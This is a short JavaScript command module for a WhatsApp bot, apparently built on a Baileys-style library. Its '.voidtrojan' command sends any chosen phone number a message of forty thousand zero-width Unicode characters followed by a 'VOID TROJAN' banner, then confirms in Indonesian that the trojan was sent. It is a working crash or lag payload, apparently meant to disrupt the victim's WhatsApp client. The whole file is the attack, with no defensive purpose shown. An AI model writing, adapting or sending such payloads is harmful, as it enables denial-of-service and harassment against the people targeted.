module.exports = {
  name: 'voidtrojan',
  execute: async (client, message, args) => {
    const target = args[0];
    if (!target) {
      return message.reply('👑 Format: .voidtrojan [target]');
    }

    const voidPayload = '\u200B\u200C\u200D\uFEFF'.repeat(10000) + '☠️👑 VOID TROJAN SUPREME ACTIVATED.';
    await client.sendMessage(target + '@s.whatsapp.net', { text: voidPayload });

    return message.reply(`👑 Void Trojan berhasil dikirim ke ${target}.`);
  }
};
